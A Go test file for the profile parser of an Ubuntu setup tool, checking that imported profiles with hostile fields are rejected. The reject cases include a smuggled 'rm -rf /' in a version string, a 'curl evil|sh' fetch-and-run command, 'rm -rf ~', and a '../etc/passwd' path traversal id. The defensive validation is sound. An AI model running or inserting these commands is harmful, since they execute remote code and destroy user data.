package store

import (
	"strings"
	"testing"

	"meuubuntu/internal/catalog"
)

func cat(t *testing.T) *catalog.Catalog {
	c, err := catalog.Load()
	if err != nil {
		t.Fatal(err)
	}
	return c
}

func TestParseProfileRejects(t *testing.T) {
	c := cat(t)
	cases := map[string]struct{ json, want string }{
		"schema":         {`{"schema":"other","version":2,"id":"x1","name":"x","selections":{}}`, "não é um perfil"},
		"future version": {`{"schema":"meu-ubuntu/profile","version":99,"name":"x","selections":{}}`, "não suportada"},
		"no name":        {`{"schema":"meu-ubuntu/profile","version":2,"id":"x1","selections":{}}`, "nome"},
		"bad option":     {`{"schema":"meu-ubuntu/profile","version":2,"id":"x1","name":"x","selections":{"php":{"options":{"versions":["7.4"]}}}}`, "não permitido"},
		"injection":      {`{"schema":"meu-ubuntu/profile","version":2,"id":"x1","name":"x","selections":{"php":{"options":{"versions":["8.5; rm -rf /"]}}}}`, "não permitido"},
		"unknown key":    {`{"schema":"meu-ubuntu/profile","version":2,"id":"x1","name":"x","selections":{"htop":{"options":{"cmd":["x"]}}}}`, "desconhecida"},
		"command field":  {`{"schema":"meu-ubuntu/profile","version":2,"id":"x1","name":"x","command":"curl evil|sh","selections":{}}`, "não permitidos"},
		"script in item": {`{"schema":"meu-ubuntu/profile","version":2,"id":"x1","name":"x","selections":{"htop":{"script":"rm -rf ~"}}}`, "não permitidos"},
		"v1 extra field": {`{"schema":"meu-ubuntu/profile","version":1,"name":"x","postInstall":"reboot","selections":{}}`, "não permitidos"},
		"secret value":   {`{"schema":"meu-ubuntu/profile","version":2,"id":"x1","name":"x","selections":{"git-defaults":{"options":{"editor":["token=abc"]}}}}`, ""},
		"key material":   {`{"schema":"meu-ubuntu/profile","version":2,"id":"x1","name":"x","description":"-----BEGIN OPENSSH PRIVATE KEY-----","selections":{}}`, "chaves"},
		"bad id":         {`{"schema":"meu-ubuntu/profile","version":2,"id":"../etc/passwd","name":"x","selections":{}}`, "identificador"},
		"bad arch":       {`{"schema":"meu-ubuntu/profile","version":2,"id":"x1","name":"x","requires":{"arch":["sparc"]},"selections":{}}`, "arquitetura"},
	}
	for name, tc := range cases {
		_, _, err := ParseProfile(c, []byte(tc.json))
		if err == nil || !strings.Contains(err.Error(), tc.want) {
			t.Errorf("%s: got %v, want %q", name, err, tc.want)
		}
	}
}

func TestV1ProfileMigrates(t *testing.T) {
	c := cat(t)
	v1 := `{"schema":"meu-ubuntu/profile","version":1,"name":"Portátil trabalho","description":"antigo","builtin":false,"created":"2026-10-04T10:00:00Z","selections":{"htop":{},"php":{"options":{"versions":["8.5"]}},"removido-no-futuro":{}}}`
	p, w, err := ParseProfile(c, []byte(v1))
	if err != nil {
		t.Fatal(err)
	}
	if p.Version != ProfileVersion || p.ID != "port-til-trabalho" || len(p.Selections) != 2 || len(w) != 2 {
		t.Fatalf("migration: %+v warnings=%v", p, w)
	}
	// Exported v2 parses back identically.
	b, _ := MarshalExport(*p)
	p2, _, err := ParseProfile(c, b)
	if err != nil || p2.ID != p.ID || len(p2.Selections) != 2 {
		t.Fatalf("roundtrip: %v %+v", err, p2)
	}
}

func TestUnknownItemsDroppedWithWarning(t *testing.T) {
	c := cat(t)
	p, w, err := ParseProfile(c, []byte(`{"schema":"meu-ubuntu/profile","version":2,"id":"x1","name":"x","selections":{"htop":{},"from-the-future":{}}}`))
	if err != nil || len(w) != 1 || len(p.Selections) != 1 {
		t.Fatalf("w=%v err=%v", w, err)
	}
}

func TestSaveAndReopenProfile(t *testing.T) {
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	t.Setenv("XDG_DATA_HOME", t.TempDir())
	s, err := New("t")
	if err != nil {
		t.Fatal(err)
	}
	p := Profile{ID: "meu-pc", Name: "Meu PC", Selections: map[string]catalog.Selection{"php": {Options: map[string][]string{"versions": {"8.5"}}}}}
	if err := s.SaveProfile(p, SourceMine, false); err != nil {
		t.Fatal(err)
	}
	if err := s.SaveProfile(p, SourceMine, false); err != ErrExists {
		t.Fatalf("same ID must not be silently replaced, got %v", err)
	}
	got := s.ListProfiles(cat(t))
	if len(got) != 1 || got[0].Name != "Meu PC" || got[0].Schema != ProfileSchema || got[0].Selections["php"].Options["versions"][0] != "8.5" {
		t.Fatalf("%+v", got)
	}
}
